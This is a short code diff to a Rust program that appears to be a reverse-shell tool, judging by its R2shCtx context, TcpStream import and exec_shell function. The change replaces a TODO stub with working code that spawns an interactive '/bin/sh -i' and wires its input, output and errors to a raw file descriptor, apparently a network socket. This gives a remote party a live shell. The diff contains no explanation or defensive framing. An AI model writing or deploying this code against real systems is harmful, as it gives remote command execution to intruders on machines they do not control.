@@ -2,8 +2,8 @@ extern crate getopts;
 
 use std::env::args;
 use std::net::TcpStream;
-use std::os::fd::AsRawFd;
-use std::process::exit;
+use std::os::fd::{AsRawFd, FromRawFd};
+use std::process::{Command, exit, Stdio};
 
 use getopts::Options;
 
@@ -51,7 +51,15 @@ fn parse_args() -> Option<R2shCtx> {
 }
 
 fn exec_shell(fd: i32) {
-    println!("TODO, fd: {}", fd)
+    Command::new("/bin/sh")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
 }
 
 fn run(ctx: R2shCtx) {
